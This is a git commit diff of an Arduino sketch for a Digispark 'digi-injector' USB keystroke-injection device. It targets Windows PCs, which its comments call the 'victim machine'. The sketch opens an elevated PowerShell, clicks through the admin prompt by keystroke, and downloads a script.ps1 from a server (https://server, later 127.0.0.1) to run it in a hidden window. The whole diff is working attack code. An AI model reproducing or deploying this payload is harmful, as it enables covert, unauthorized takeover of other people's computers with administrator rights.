4592ad6507c6d1912e8391516ad46649cd554b53
Spider Sec <suvadip.tech@gmail.com>
2018-09-14 18:15:57 +0530

    Update and rename powershell-script-execute/script.ino to digi-injector/script.ino

--- digi-injector/script.ino
+++ digi-injector/script.ino
@@ -1,29 +1,23 @@
-// Triggers admin and executes following
+// Triggers admin on windows pc and executes following
 // Downloads powershell script from server and execute it in hidden mode.
 // Set 'Deleys' according to the performance of the victim machine.
-
+// note:- it triggers admin on personal computers only.
 #include "DigiKeyboard.h"
 void setup() {
 }
 
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(300);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
-  DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://server/scripts/script.ps1','script.ps1');");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(750);
-  DigiKeyboard.print("powershell.exe -windowstyle hidden -File script.ps1");
+  DigiKeyboard.print("powershell [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(new-object net.webclient).DownloadFile('http://127.0.0.1/test/files/script.ps1','script.ps1');powershell -windowstyle hidden ./script.ps1;");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     
